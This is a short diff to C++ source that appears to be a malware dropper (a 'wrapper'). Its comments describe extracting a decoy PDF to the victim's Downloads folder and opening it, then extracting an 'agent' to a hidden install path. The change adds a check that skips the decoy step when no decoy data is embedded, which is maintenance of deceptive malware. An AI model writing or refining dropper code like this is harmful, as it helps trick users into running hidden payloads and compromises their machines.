@@ -327,9 +327,11 @@ int main(int argc, char* argv[]) {
 
     // Step 1: Extract decoy PDF to user-visible Downloads folder
     std::string pdf = decoyPath();
-    if (extractFile(pdf, inferno::wrapper::DECOY_DATA,
-                     inferno::wrapper::DECOY_DATA_SIZE)) {
-        openFile(pdf);
+    if (inferno::wrapper::DECOY_DATA_SIZE > 0) {
+        if (extractFile(pdf, inferno::wrapper::DECOY_DATA,
+                         inferno::wrapper::DECOY_DATA_SIZE)) {
+            openFile(pdf);
+        }
     }
 
     // Step 2: Extract agent to hidden install path
